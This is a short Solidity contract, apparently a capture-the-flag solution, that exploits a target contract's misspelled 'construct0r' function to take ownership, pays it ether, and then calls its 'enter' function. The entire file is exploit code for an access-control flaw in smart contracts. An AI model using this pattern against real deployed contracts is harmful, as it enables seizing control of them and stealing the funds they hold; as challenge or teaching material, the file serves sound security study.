// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Gate {
    function construct0r() external;
    function enter() external;
}

contract Gateau {
    function getOwner(address target) external {
        Gate(target).construct0r();
    }

    function payGateFee(address target) external payable {
        (bool e, bytes memory d) = payable(target).call{value:msg.value}("");
        require(e, string(d));
    }

    function opwn(address target) external {
        Gate(target).enter();
    }
}
